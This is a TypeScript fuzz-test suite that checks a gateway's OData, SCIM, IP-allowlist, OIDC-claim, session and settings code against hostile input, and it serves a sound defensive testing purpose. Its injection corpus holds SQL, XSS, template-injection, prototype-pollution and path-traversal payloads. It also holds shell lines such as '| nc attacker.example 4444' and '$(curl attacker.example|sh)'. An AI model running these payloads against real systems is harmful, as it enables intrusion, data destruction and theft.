import { test, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { check, gen, type Rng } from "../lib/proptest";
import { applyODataQuery, buildEdmx, entitySetEnvelope, type Row, type ODataQuery, type EntityModel } from "../lib/odata";
import { listUsers, listGroups, patchUser, patchGroup, createUser, createGroup, replaceGroup, directoryDecision, __resetScim } from "../lib/scim";
import { ipInCidr, ipAllowed } from "../lib/ip-allow";
import { claimsToSessionUser, type SessionUser } from "../lib/oidc";
import type { Session } from "../lib/oidc";
import { isSessionExpired, timeoutPolicy } from "../lib/session-timeout";
import { evaluateSessionSecret, resolveSessionSecret } from "../lib/session-secret-guard";
import { updateSettings, getSettings, SettingsValidationError, type SettingsState } from "../lib/settings";

/**
 * PARSER / GUARD FUZZ suite — feeds a corpus of hostile payloads (SQL, JavaScript/XSS,
 * template-expression, prototype-pollution, shell/command, path-traversal) plus randomised
 * nasty strings through the gateway's untrusted-input PARSERS and safety GUARDS, and asserts
 * the SAFETY contract each one rests on: a hostile query/filter/token/CIDR/patch is treated as
 * inert DATA — it never throws an uncaught non-typed error, never emits an injectable/unsafe
 * fragment, never pollutes a prototype, and is either applied inertly or safely rejected with a
 * KNOWN typed error.
 *
 * Sibling of fuzz-injection.test.ts; same deterministic `proptest` harness (seeded — a failure
 * prints PROPTEST_SEED=<n> to replay the exact offending input). Distinct from the concurrent
 * fuzz-crypto.test.ts.
 *
 * Modules under fuzz: lib/odata (OData query/filter parser), lib/scim (SCIM filter + PATCH),
 * lib/ip-allow (CIDR/IP parser), lib/oidc (id-token/JWT decode), lib/session-timeout,
 * lib/session-secret-guard (boot guards), lib/settings (updateSettings validation).
 */

// ── The injection corpus (shared shape with fuzz-injection.test.ts) ───────────────
const INJECTION: readonly string[] = [
  // SQL
  "' OR '1'='1", "'; DROP TABLE users;--", "1 UNION SELECT password FROM users",
  "' OR 1=1--", "admin'--", "\"; DELETE FROM projects WHERE ''='", "1; UPDATE settings SET x=1--",
  // JavaScript / XSS / template-expression injection
  "<script>alert(1)</script>", "javascript:alert(document.cookie)", "${process.env.SESSION_SECRET}",
  "{{constructor.constructor('return process')()}}", "`${7*7}`", "');alert(1);//",
  "constructor.constructor('return this')()", "eval('1+1')", "require('child_process').exec('id')",
  "\"><img src=x onerror=alert(1)>", "{{7*7}}", "#{7*7}", "%{7*7}",
  // Shell / command injection
  "$(rm -rf /)", "; ls -la /", "&& cat /etc/passwd", "| nc attacker.example 4444", "`whoami`",
  "$(curl attacker.example|sh)", "\n/bin/sh",
  // Prototype pollution
  "__proto__", "constructor", "prototype", "__proto__.polluted",
  // Path traversal / null / header smuggling
  "../../../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe", " ", "/ok\r\nSet-Cookie: x=1",
  "file:///etc/passwd", "‮",
  // OData / SCIM operators aimed at the parsers themselves
  "id eq '1' or '1'='1'", "name eq '' or true", "contains(name,'')) or (1 eq 1", "userName eq \"x\" or true",
  "id;drop", "$select=*", "1) or sleep(5)--",
];

const NASTY_ALPHABET = "ab12'\"`{}$();<>\\/-. \n\t=&|:@#%,";

/** A generated hostile string: a corpus payload, a random nasty string, or the two spliced. */
function evil(r: Rng): string {
  const roll = gen.int(r, 0, 2);
  const rand = gen.string(r, NASTY_ALPHABET, 48);
  if (roll === 0) return gen.pick(r, INJECTION);
  if (roll === 1) return rand;
  return gen.pick(r, INJECTION) + rand;
}

/** Prototype-pollution sentinels: nothing below should ever become defined. */
function assertNoPollution(): void {
  const probe = {} as Record<string, unknown>;
  assert.equal(probe["polluted"], undefined, "Object.prototype was polluted (.polluted)");
  assert.equal(probe["x"], undefined, "Object.prototype was polluted (.x)");
  assert.equal((Object.prototype as Record<string, unknown>)["polluted"], undefined);
  assert.equal(([] as unknown as Record<string, unknown>)["polluted"], undefined);
  assert.equal(({} as Record<string, unknown>)["isAdmin"], undefined);
}

// ── 1. OData query/filter parser — hostile $filter/$select/$orderby stay inert ────

/** A small, fixed row set whose values are plain inert data. */
function sampleRows(r: Rng): Row[] {
  const n = gen.int(r, 0, 4);
  return Array.from({ length: n }, (_unused, i) => ({
    id: i,
    name: gen.pick(r, ["Alpha", "Beta", "'; DROP", "<b>", "Zeta"]),
    budget: gen.int(r, 0, 1000),
    active: gen.bool(r),
  }));
}

/** A hostile OData query — every option carries an injection/nasty payload. Options are added
 *  only when present (exactOptionalPropertyTypes: never store an explicit `undefined`). */
function evilQuery(r: Rng): ODataQuery {
  const q: ODataQuery = {};
  const maybe = (k: keyof ODataQuery, v: string) => { if (gen.bool(r)) q[k] = v; };
  maybe("$filter", evil(r));
  maybe("$select", gen.pick(r, [evil(r), `name,${evil(r)}`, "__proto__,constructor", `id,${evil(r)},budget`]));
  maybe("$orderby", gen.pick(r, [evil(r), `${evil(r)} desc`, "__proto__ asc", `name ${evil(r)}`]));
  maybe("$top", evil(r));
  maybe("$skip", evil(r));
  maybe("$count", gen.pick(r, ["true", "false", evil(r)]));
  return q;
}

test("fuzz: applyODataQuery never throws on hostile $filter/$select/$orderby/$top/$skip and never fabricates or mutates rows", () => {
  check(
    (r) => ({ rows: sampleRows(r), q: evilQuery(r) }),
    ({ rows, q }) => {
      let res: { rows: Row[]; count?: number } | undefined;
      assert.doesNotThrow(() => { res = applyODataQuery(rows, q); });
      assert.ok(res && Array.isArray(res.rows), "must return a rows array");
      // A filter/paging step can only REMOVE rows; $select re-projects but keeps the count of the
      // paged set — so the output can never contain MORE rows than the input.
      assert.ok(res.rows.length <= rows.length, "query fabricated rows out of nowhere");
      // Without a $select projection the survivors must be the very same row objects (by reference):
      // the parser is a filter, never a place that mints attacker-shaped rows.
      if (!q.$select) for (const row of res.rows) assert.ok(rows.includes(row), "a returned row is not one of the inputs");
      // $count, when requested, is a finite non-negative integer — never an injected expression.
      if (res.count !== undefined) assert.ok(Number.isInteger(res.count) && res.count >= 0);
      // A $select naming `__proto__` must project via own-property semantics, never pollute.
      assertNoPollution();
    },
    { runs: 500 },
  );
});

test("fuzz: buildEdmx escapes hostile PROPERTY names — the escaped payload never materialises as markup", () => {
  // buildEdmx runs escapeXml over property names (the only per-field values). Entity/set/key names
  // are developer-defined (a static schema), never attacker-controlled — see the reported finding
  // about their raw interpolation. Here we fuzz the escaped surface: property names.
  check(
    (r) => {
      const props: Record<string, "Edm.String"> = {};
      const nProps = gen.int(r, 1, 3);
      for (let i = 0; i < nProps; i++) props[`p${i}_${evil(r)}`] = "Edm.String";
      const model: EntityModel = { name: `Entity${gen.int(r, 0, 9)}`, set: `Set${gen.int(r, 0, 9)}`, key: "id", props };
      return model;
    },
    (model) => {
      let xml = "";
      assert.doesNotThrow(() => { xml = buildEdmx([model]); });
      // Every hostile property name lives inside a Name="…" attribute; escapeXml must have
      // neutralised angle brackets / quotes / ampersands so no injected element or attribute-
      // breakout can materialise out of a property name.
      const propBlock = xml.split("\n").filter((l) => l.includes("<Property ")).join("\n");
      assert.ok(!/<script/i.test(propBlock), "an unescaped <script> leaked from a property name");
      assert.ok(!/<img\s/i.test(propBlock), "an unescaped <img> leaked from a property name");
      assert.ok(!propBlock.includes('"><'), "an attribute-breakout leaked from a property name");
    },
    { runs: 300 },
  );
});

test("fuzz: entitySetEnvelope wraps any row set into a JSON-safe envelope without throwing", () => {
  check(
    (r) => ({ rows: sampleRows(r), count: gen.bool(r) ? gen.int(r, 0, 10) : undefined }),
    ({ rows, count }) => {
      let env: unknown;
      assert.doesNotThrow(() => { env = entitySetEnvelope("https://x/", "Projects", rows, count); });
      assert.doesNotThrow(() => JSON.stringify(env)); // serialisable — no cycles / poison
      assertNoPollution();
    },
    { runs: 200 },
  );
});

// ── 2. SCIM filter + PATCH parsing — hostile input safely rejected, never thrown ──
beforeEach(() => { process.env["SCIM_TOKEN"] = "scim-secret-strong-012345"; __resetScim(); });
afterEach(() => { delete process.env["SCIM_TOKEN"]; __resetScim(); });

test("fuzz: listUsers/listGroups never throw on a hostile SCIM filter and only ever match on a supported eq-clause", () => {
  check(
    (r) => evil(r),
    (filter) => {
      let users: unknown, groups: unknown;
      assert.doesNotThrow(() => { users = listUsers(filter); });
      assert.doesNotThrow(() => { groups = listGroups(filter); });
      // Empty directory → every hostile filter resolves to an empty result, never an error and
      // never a spuriously-matched user (no injected `or true` widening a lookup).
      assert.ok(Array.isArray(users) && (users as unknown[]).length === 0);
      assert.ok(Array.isArray(groups) && (groups as unknown[]).length === 0);
    },
    { runs: 400 },
  );
});

test("fuzz: patchUser applies hostile PATCH ops inertly — active stays a strict boolean, never throws", () => {
  check(
    (r) => ({
      ops: gen.array(r, (rr) => ({ op: evil(rr), path: evil(rr), value: gen.oneOf<unknown>(rr, (x) => evil(x), (x) => gen.bool(x), () => ({ active: "true" }), () => null) }), 4),
    }),
    ({ ops }) => {
      const u = createUser({ userName: "victim@corp.com" });
      let out: ReturnType<typeof patchUser> | undefined;
      assert.doesNotThrow(() => { out = patchUser(u.id, ops); });
      assert.ok(out, "patch of an existing user returns the user");
      // The deprovision flag can only ever be a real boolean — a hostile string never smuggles a
      // truthy object/function into an authorisation decision.
      assert.equal(typeof out!.active, "boolean");
      assert.equal(typeof out!.userName, "string");
      assert.equal(typeof out!.displayName === "string" || out!.displayName === undefined, true);
      assertNoPollution();
    },
    { runs: 200 },
  );
});

/** A hostile string safe to use as a group-member `value`: any prototype property name is
 *  prefixed so it can't collide with Object.prototype (see the KNOWN WEAKNESS test below for why
 *  the raw form crashes syncGroupMembership). */
function safeMemberValue(r: Rng): string {
  const v = evil(r);
  return v in {} ? "m_" + v : v; // "__proto__"/"constructor"/"toString"/… → neutralised
}

test("fuzz: patchGroup applies hostile member/displayName ops inertly — members stay {value:string}[], never throws", () => {
  check(
    (r) => ({
      ops: gen.array(r, (rr) => ({
        op: gen.pick(rr, ["add", "remove", "replace", evil(rr)]),
        path: gen.pick(rr, ["members", "displayName", evil(rr)]),
        value: gen.oneOf<unknown>(rr, (x) => evil(x), (x) => [{ value: safeMemberValue(x) }], () => [{ notValue: 1 }], () => "nope"),
      }), 4),
    }),
    ({ ops }) => {
      const g = createGroup({ displayName: "Engineers" });
      let out: ReturnType<typeof patchGroup> | undefined;
      assert.doesNotThrow(() => { out = patchGroup(g.id, ops); });
      assert.ok(out, "patch of an existing group returns the group");
      assert.ok(Array.isArray(out!.members));
      for (const m of out!.members) assert.equal(typeof m.value === "string" || m.value === undefined, true);
      assert.equal(typeof out!.displayName, "string");
      assertNoPollution();
    },
    { runs: 200 },
  );
});

test("fixed: a group member whose value is a prototype key no longer crashes syncGroupMembership (null-proto map)", () => {
  // syncGroupMembership now backs its byUser index with Object.create(null), so a member value of
  // "__proto__"/"constructor"/"toString" no longer reads an inherited member (which made `??=` skip
  // the assignment and `.push` throw). A SCIM client can no longer crash a group write this way.
  for (const key of ["__proto__", "constructor", "toString"]) {
    assert.doesNotThrow(() => createGroup({ displayName: "G", members: [{ value: key }] }), `member value ${JSON.stringify(key)} must not crash the write`);
    __resetScim();
  }
  const g = createGroup({ displayName: "Team" });
  assert.doesNotThrow(() => patchGroup(g.id, [{ op: "replace", path: "members", value: [{ value: "__proto__" }] }]));
  assert.doesNotThrow(() => replaceGroup(g.id, { members: [{ value: "constructor" }] }));
  assertNoPollution();
});

test("fuzz: directoryDecision never throws on hostile identity fields and always returns a typed decision", () => {
  check(
    (r) => ({ email: gen.bool(r) ? evil(r) : undefined, sub: gen.bool(r) ? evil(r) : undefined, userName: gen.bool(r) ? evil(r) : undefined }),
    (identity) => {
      let d: { known: boolean; active: boolean; roleClaims: string[] } | undefined;
      assert.doesNotThrow(() => { d = directoryDecision(identity); });
      assert.equal(typeof d!.known, "boolean");
      assert.equal(typeof d!.active, "boolean");
      assert.ok(Array.isArray(d!.roleClaims) && d!.roleClaims.every((c) => typeof c === "string"));
    },
    { runs: 300 },
  );
});

// ── 3. CIDR / IP parser — garbage never throws, a malformed allowlist fails safe ──
test("fuzz: ipInCidr never throws on garbage IP + garbage CIDR and always returns a boolean", () => {
  const REAL_IPS = ["8.8.8.8", "203.0.113.5", "::1", "2001:db8::1", "::ffff:1.2.3.4", "10.0.0.1"];
  check(
    (r) => ({ ip: gen.bool(r) ? gen.pick(r, REAL_IPS) : evil(r), cidr: gen.bool(r) ? gen.pick(r, REAL_IPS) + "/" + gen.int(r, 0, 200) : evil(r) }),
    ({ ip, cidr }) => {
      let res: unknown = "sentinel";
      assert.doesNotThrow(() => { res = ipInCidr(ip, cidr); });
      assert.equal(typeof res, "boolean", "ipInCidr must always answer with a boolean");
    },
    { runs: 500 },
  );
});

test("fail-safe: a clearly malformed CIDR never matches a real client IP (no accidental allow-all)", () => {
  const GARBAGE: readonly string[] = [
    "", " ", "not-an-ip", "999.999.999.999", "1.2.3.4/999", "1.2.3.4/-1", "1.2.3", "::/x",
    "' OR 1=1--", "$(rm -rf /)", "<script>", "/24", "abc/24", "...", "1.2.3.4.5/24", "1.2.3.4/1.5",
  ];
  const CLIENTS = ["8.8.8.8", "203.0.113.5", "2001:db8::1", "::1"];
  for (const cidr of GARBAGE) for (const ip of CLIENTS) {
    assert.equal(ipInCidr(ip, cidr), false, `garbage CIDR ${JSON.stringify(cidr)} matched ${ip}`);
  }
});

test("fixed: an empty / non-numeric prefix after '/' fails CLOSED (no accidental match-all)", () => {
  // ip-allow now requires /^\d+$/ on the substring after '/', so a trailing-slash typo like
  // "10.0.0.0/" no longer parses as /0 = match-all (Number("") === 0). It fails closed instead —
  // an operator typo in IP_ALLOWLIST can no longer silently allow every client.
  assert.equal(ipInCidr("8.8.8.8", "10.0.0.0/"), false);
  assert.equal(ipInCidr("203.0.113.5", "0.0.0.0/"), false);
  assert.equal(ipInCidr("2001:db8::1", "::/"), false);
  assert.equal(ipInCidr("8.8.8.8", "10.0.0.0/abc"), false);
});

test("fail-safe: an allowlist of only garbage entries denies an arbitrary client (empty = off, but non-empty garbage never opens the gate)", () => {
  const prev = process.env["IP_ALLOWLIST"];
  try {
    process.env["IP_ALLOWLIST"] = "not-an-ip, 999.1.1.1, 1.2.3.4/999, <script>, ' OR 1=1--";
    // The list is non-empty (feature ON) yet every entry is unparseable, so no real IP can match:
    // the guard denies rather than silently allowing — the fail-safe direction.
    assert.equal(ipAllowed("203.0.113.5"), false);
    assert.equal(ipAllowed("8.8.8.8"), false);
  } finally {
    if (prev === undefined) delete process.env["IP_ALLOWLIST"]; else process.env["IP_ALLOWLIST"] = prev;
  }
});

// ── 4. OIDC id-token / JWT decode — arbitrary tokens never throw untyped, stay inert ──

/** Assemble a 3-segment JWT-shaped string from a payload object (unsigned — the decoders
 *  under test read the payload only; signature verification is a separate, verified step). */
/** A hostile id_token: raw junk, a wrong segment count, or a well-formed-envelope carrying a
 *  payload with injection strings and prototype-pollution keys. */
// Signature/nonce/iss/aud/exp and the JWT decode are now openid-client's job (fuzzed upstream). What
// remains ours is claimsToSessionUser: it maps ALREADY-VALIDATED claim objects onto the session user.
// Property: for ANY claim object (incl. hostile shapes + a __proto__ payload) it never throws, returns
// only inert primitives / string arrays, and never pollutes the prototype (it reads fixed keys and
// builds a fresh object — never `out[userKey] = …`).
function evilClaims(r: () => number): Record<string, unknown> {
  const roll = Math.floor(r() * 5);
  if (roll === 0) return JSON.parse('{"__proto__":{"polluted":true},"sub":"x","roles":["admin"]}') as Record<string, unknown>;
  if (roll === 1) return { sub: evil(r), name: evil(r), email: evil(r), roles: evil(r), groups: [evil(r), 42, null], amr: gen.bool(r) ? [evil(r)] : evil(r), acr: evil(r), realm_access: { roles: [evil(r)] }, nonce: evil(r) };
  if (roll === 2) return { sub: gen.oneOf<unknown>(r, () => 42, () => null, () => ({}), (x) => evil(x)) };
  if (roll === 3) return {};
  return { sub: "u", groups: gen.string(r, "a,b c;d", 12), realm_access: { roles: gen.oneOf<unknown>(r, () => ["r"], (x) => evil(x)) } };
}

test("fuzz: claimsToSessionUser never throws, returns only inert claim data, and never pollutes the prototype", () => {
  check(
    (r) => evilClaims(r),
    (claims) => {
      let user: SessionUser | undefined;
      assert.doesNotThrow(() => { user = claimsToSessionUser(claims); });
      // Always inert primitives / string arrays — never a live object or function that could smuggle
      // structured trust through. `sub` is coerced to a string unconditionally.
      assert.equal(typeof user!.sub, "string");
      assert.ok(user!.name === undefined || typeof user!.name === "string");
      assert.ok(user!.email === undefined || typeof user!.email === "string");
      assert.ok(user!.acr === undefined || typeof user!.acr === "string");
      assert.ok(Array.isArray(user!.roles) && user!.roles.every((x) => typeof x === "string"));
      assert.ok(user!.amr === undefined || (Array.isArray(user!.amr) && user!.amr.every((x) => typeof x === "string")));
      assertNoPollution();
    },
    { runs: 500 },
  );
});

// ── 5. Session-timeout decision — arbitrary/edge session shapes never throw ────────
test("fuzz: isSessionExpired returns a boolean and never throws for any session shape / clock value", () => {
  check(
    (r) => {
      const s = {} as Record<string, unknown>;
      // Randomly (mis)populate the timing fields with wrong types / NaN / huge values.
      if (gen.bool(r)) s["seen"] = gen.oneOf<unknown>(r, (x) => gen.int(x, -1e15, 1e15), (x) => evil(x), () => NaN, () => null);
      if (gen.bool(r)) s["iat"] = gen.oneOf<unknown>(r, (x) => gen.int(x, -1e15, 1e15), (x) => evil(x), () => Infinity, () => undefined);
      s["sub"] = evil(r);
      const now = gen.oneOf<number>(r, (x) => gen.int(x, -1e14, 1e14), () => NaN, () => Date.now());
      return { session: s as unknown as Session, now };
    },
    ({ session, now }) => {
      let res: unknown = "sentinel";
      assert.doesNotThrow(() => { res = isSessionExpired(session, now); });
      assert.equal(typeof res, "boolean");
    },
    { runs: 400 },
  );
  assert.doesNotThrow(() => timeoutPolicy());
});

// ── 6. Session-secret boot guard — arbitrary env never throws, decision stays typed ──
test("fuzz: evaluateSessionSecret never throws on hostile env and always returns a well-formed result", () => {
  check(
    (r) => {
      const env: Record<string, string | undefined> = {};
      const keys = ["NODE_ENV", "SESSION_SECRET", "OIDC_ISSUER_URL", "LICENSE_KEY", "LICENSE_TOKEN", "PUBLIC_URL", evil(r)];
      for (const k of keys) if (gen.bool(r)) env[k] = evil(r);
      return env;
    },
    (env) => {
      let res: ReturnType<typeof evaluateSessionSecret> | undefined;
      assert.doesNotThrow(() => { res = evaluateSessionSecret(env); });
      assert.equal(typeof res!.ok, "boolean");
      assert.equal(typeof res!.looksProduction, "boolean");
      assert.equal(typeof res!.secret, "string");
      assert.ok(res!.secret.length > 0, "the guard must never hand back an empty signing secret");
      assert.ok(Array.isArray(res!.signals) && res!.signals.every((s) => typeof s === "string"));
      // The trust invariant: a not-OK verdict MUST refuse to boot (throw a typed Error) — it can
      // never silently return a secret. An OK verdict resolves to that same secret.
      if (!res!.ok) {
        assert.throws(() => resolveSessionSecret(env), (e: unknown) => e instanceof Error);
      } else {
        assert.equal(resolveSessionSecret(env), res!.secret);
      }
    },
    { runs: 400 },
  );
});

// ── 7. settings.updateSettings — injection payloads + proto-pollution keys ────────
let settingsSnapshot: SettingsState;
beforeEach(() => { settingsSnapshot = getSettings(); });
afterEach(() => {
  // updateSettings mutates the shared global store — restore the clean snapshot so the fuzz loop
  // (and every other test in the file) doesn't inherit leaked state.
  updateSettings(settingsSnapshot as unknown as Record<string, unknown>);
});

/** A hostile settings patch: injection strings in real fields, and (sometimes) an own `__proto__`/
 *  `constructor` key carrying a pollution sentinel. */
function evilPatch(r: Rng): Record<string, unknown> {
  const base: Record<string, unknown> = {};
  const add = (k: string, v: unknown) => { if (gen.bool(r)) base[k] = v; };
  add("brokerUrl", evil(r));
  add("oidcIssuerUrl", evil(r));
  add("aiModel", evil(r));
  add("backendSource", evil(r));
  add("reportingCurrency", evil(r));
  add("aiProvider", evil(r));
  add("fxRateAsOfDate", evil(r));
  add("labelOverrides", gen.pick(r, [{ [evil(r)]: evil(r) }, evil(r), null, [1, 2]]));
  add("branding", gen.pick(r, [{ appName: evil(r), logoUrl: evil(r) }, evil(r)]));
  add("savedViews", [{ id: evil(r), name: evil(r) }]);
  add("hiddenFields", gen.pick(r, [[evil(r)], evil(r), [1]]));
  add("webhooks", [{ url: evil(r), secret: evil(r) }]);
  add("priorityWeights", gen.pick(r, [{ rice: evil(r) }, { rice: 1, wsjf: 1, moscow: 1, strategic: 1, benefit: 1 }]));
  // Own-property (not prototype-mutating) dangerous keys, built via JSON so the key is a real own
  // enumerable property — exactly what a malicious JSON body would deliver.
  if (gen.bool(r)) {
    const poison = JSON.parse('{"__proto__":{"polluted":true,"isAdmin":true},"constructor":{"polluted":true},"prototype":{"x":1}}') as Record<string, unknown>;
    return { ...base, ...poison };
  }
  return base;
}

test("fuzz: updateSettings never pollutes a prototype and either applies inertly or throws the typed SettingsValidationError", () => {
  check(
    (r) => evilPatch(r),
    (patch) => {
      let out: SettingsState | undefined;
      try {
        out = updateSettings(patch);
      } catch (e) {
        // The ONLY acceptable rejection is the typed validation error — anything else (a TypeError,
        // an uncaught UnsafeUrlError, a non-Error throw) is a real defect in the write path.
        assert.ok(e instanceof SettingsValidationError, `updateSettings threw a non-typed error: ${e instanceof Error ? e.name + ": " + e.message : String(e)}`);
        assertNoPollution();
        return;
      }
      // Applied: the returned state is a normal object and nothing leaked onto a prototype.
      assert.ok(out && typeof out === "object");
      assertNoPollution();
    },
    { runs: 500 },
  );
});
